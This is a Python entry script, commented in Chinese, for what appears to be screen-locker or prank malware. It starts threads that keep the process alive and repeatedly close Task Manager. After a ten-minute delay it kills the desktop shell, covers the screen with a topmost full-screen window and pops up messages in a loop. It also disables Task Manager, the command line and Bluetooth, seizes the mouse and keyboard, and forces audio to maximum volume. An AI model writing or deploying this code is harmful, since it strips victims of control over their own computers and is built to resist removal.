import os
from time import sleep
from threading import Thread
from utils.ShowMessage import showMessage
from utils.PlayAudio import playAudio, speakText 
from utils.TaskManager import monitorTaskManager 
from utils.ControlMouseKeys import controlMouseKeys
from utils.PermissionControl import controlTaskManager, disableBluetooth, disableCmd 
from utils.ControlSystem import endDesktopProgram, fullScreenWindow, monitorProcess, errorWindow 


# 定义路径
playAudioPath = os.path.join(os.path.dirname(__file__), 'static', 'audio', 'audio.mp3') 
fullScreenWindowPath = os.path.join(os.path.dirname(__file__), 'static', 'image', 'logo.jpg') 
showMessagePath = os.path.join(os.path.dirname(__file__), 'static', 'popups', 'positions.txt') 


# 主函数
if __name__ == '__main__':
    try:
        Thread(target=errorWindow).start() # 弹出错误窗口

        Thread(target=monitorProcess).start() # 保活进程防止被杀死
        Thread(target=monitorTaskManager).start() # 循环关闭任务管理器

        sleep(600) # 延时

        Thread(target=endDesktopProgram).start() # 杀死桌面程序造成白屏
        Thread(target=fullScreenWindow, args=(fullScreenWindowPath,)).start() # 创建全屏窗口置顶占领桌面
        Thread(target=showMessage, args=(showMessagePath,)).start() # 循环弹窗

        Thread(target=controlTaskManager).start() # 禁用任务管理器（权限）
        Thread(target=disableCmd).start() # 禁用命令行（权限）
        Thread(target=disableBluetooth).start() # 禁用蓝牙（权限）

        Thread(target=controlMouseKeys).start() # 控制鼠标和让声音一直最大
        Thread(target=playAudio, args=(playAudioPath,)).start() # 播放音频
        speakText() # 播放提示音
    except: 
        pass